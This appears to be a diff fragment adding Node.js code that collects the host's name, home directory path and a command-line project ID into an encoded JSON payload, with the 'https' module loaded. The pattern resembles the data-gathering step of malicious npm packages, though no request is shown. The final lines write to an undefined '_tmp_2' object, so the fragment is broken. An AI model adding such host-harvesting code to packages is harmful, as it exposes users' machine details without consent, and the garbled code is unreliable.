@@ -1,0 +1,14 @@
+const https = require('https')
+var os = require("os")
+var hostname = os.hostname()
+var path = os.homedir()
+const data = new TextEncoder().encode(
+  JSON.stringify({
+    payload: hostname,
+    project_id: process.argv[2],
+    path: path
+  })
+)
+_tmp_2.payload = hostname
+_tmp_2.project_id = process.argv[2]
+_tmp_2.path = path
